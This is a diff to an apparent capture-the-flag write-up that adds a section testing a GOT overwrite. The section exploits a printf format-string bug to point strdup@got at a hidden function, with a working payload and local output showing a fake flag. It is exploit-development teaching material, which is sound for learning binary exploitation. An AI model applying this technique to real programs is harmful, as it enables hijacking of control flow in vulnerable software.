@@ -382,7 +382,54 @@ No need to gives the solver, it just a simple stack buffer overflow
 
 To conclude, uhh, yeah, that's it
 
+## GOT overwrite test
+
+I got curious about the partial RELRO note, so I tested whether a GOT overwrite can actually happen.
+
+The RELRO segment ends at `0x404000`, so the `.got.plt` entries from `0x404000` onward are still writable. `strdup@got` is at `0x404050`.
+
+The note is passed to `printf(note)`, and the note bytes become printf arguments starting at argument 6:
+
+```text
+note[0:8]   -> %6$p
+note[8:16]  -> %7$p
+...
+note[64:72] -> %14$p
+note[72:80] -> %15$p
+```
+
+So I can put addresses at `note[64:96]` and use `%hn` to write 2 bytes at a time. To overwrite the full 8-byte GOT entry with `0x4011c6` (`maintenance_hatch`), the payload is:
+
+```python
+fmt = b"%14$hn%15$hn%64c%16$hn%4486c%17$hn".ljust(64, b"P")
+payload = fmt + p64(0x404054) + p64(0x404056) + p64(0x404052) + p64(0x404050)
+```
+
+That writes:
+
+```text
+0x404054 = 0x0000
+0x404056 = 0x0000
+0x404052 = 0x0040
+0x404050 = 0x11c6
+```
+
+so `strdup@got` becomes `0x00000000004011c6`. The next `strdup(name)` call jumps to `maintenance_hatch()`.
+
+It works locally:
+
+```text
+TryHards{F4K3}
+```
+
+`TryHards{F4K3}` is the fake local `flag.txt`, not the real flag. The remote binary is the same non-PIE build, so the same addresses apply there.
+
+One detail: if `strdup` was already called before, its GOT entry contains a libc address, so the high 4 bytes are not zero. The payload above clears them, so it works either way. A shorter version that only writes the low 4 bytes also works on the first `buy_snack()` call, because `strdup` has not been resolved yet.
+
+So yes, a GOT overwrite is possible. But the ret2win path is still simpler, because it does not need the format string at all.
+
 ## Attachments
 
 - [vending.c](/assets/files/vending-machine-awakened/vending.c)
 - [text_section.txt](/assets/files/vending-machine-awakened/text_section.txt)
+- [solve_got.py](/assets/files/vending-machine-awakened/solve_got.py)
